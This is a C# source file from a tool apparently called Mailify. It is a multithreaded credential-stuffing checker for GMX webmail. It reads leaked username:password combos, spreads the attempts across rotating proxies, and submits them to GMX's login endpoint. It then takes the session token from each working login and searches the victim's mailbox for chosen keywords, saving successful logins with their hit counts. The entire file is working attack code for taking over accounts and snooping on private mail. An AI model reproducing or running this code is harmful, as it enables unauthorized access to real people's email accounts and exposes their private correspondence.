using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Gmx_Scan
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Inbox_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();

            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));



                    req.AllowAutoRedirect = false;
                    req.AddHeader("Host", "login.gmx.com");
                    req.AddHeader("User-Agent", "Mozilla/5.0 (Linux; Android 5.1.1; SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36");
                    req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                    req.AddHeader("Referer", "https://www.gmx.com/");

                    var res0 = req.Post("https://login.gmx.com/login", "service=mailint&uasServiceID=mc_starter_gmxcom&successURL=https://$(clientName)-$(dataCenter).gmx.com/login&loginFailedURL=https://www.gmx.com/logout/?ls=wd&loginErrorURL=https://www.gmx.com/logout/?ls=te&edition=us&lang=en&usertype=standard&username=" + credentials[0] + "&password=" + credentials[1], "application/x-www-form-urlencoded");
                    if (res0.Location.Contains("https://navigator-bs.gmx.com/login?auth_time="))
                    {
                        var ott = Functions.LR(res0.Location, "ott=", "").FirstOrDefault();
                        req.AddHeader("Host", "3c-bs.gmx.com");
                        req.AddHeader("Connection", "keep-alive");
                        req.AddHeader("Upgrade-Insecure-Requests", "1");
                        req.AddHeader("Save-Data", "on");
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Linux; Android 5.1.1; SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36");
                        var res1 = req.Get($"https://3c-bs.gmx.com/mail/mobile/start?device=smartphone&ott={ott}&resolution=540x960&fullcomp=true");
                        string token = Functions.LR(res1.Location, "jsessionid=", "").FirstOrDefault();
                        string[] token2 = token.Split('?');
                        //----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
                        req.AllowAutoRedirect = true;
                        try
                        {
                            foreach (string keyword in File.ReadAllLines("Files//Keywords.txt"))
                            {
                                string final = req.Get($"https://3c-bs.gmx.com/mail/mobile/search;jsessionid={token2[0]}?search={keyword}").ToString();
                                string mailscount = Functions.LR(final, "<dfn title=\"Search\">", "results for &quot;").FirstOrDefault();
                                if (mailscount == null || mailscount == "0")
                                {
                                    Variables.Custom++;
                                    Variables.Checked++;
                                    Variables.cps++;
                                    lock (Variables.WriteLock)
                                    {
                                        Variables.remove(combo);
                                        File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                                    }
                                }
                                else
                                {
                                    Variables.Valid++;
                                    Variables.Checked++;
                                    Variables.cps++;
                                    lock (Variables.WriteLock)
                                    {
                                        Variables.remove(combo);
                                        if (Config.kekr_UI == "LOG")
                                        {
                                            Console.WriteLine($"[+] " + combo + " | Keyword: " + keyword + " | Results: " + mailscount, Color.Green);
                                        }
                                        File.AppendAllText(Variables.results + $"{keyword}.txt", combo + " | Keyword: " + keyword + " | Results: " + mailscount + Environment.NewLine);
                                    }
                                }

                            }

                        }
                        catch
                        {
                            Variables.Custom++;
                            Variables.Checked++;
                            Variables.cps++;
                            lock (Variables.WriteLock)
                            {
                                Variables.remove(combo);
                                File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                            }
                        }


                    }
                    else if (res0.Location.Contains("https://www.gmx.com/logout/?ls=wd") || res0.Location.Contains("interceptiontype=AbuseHardLock"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }

                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}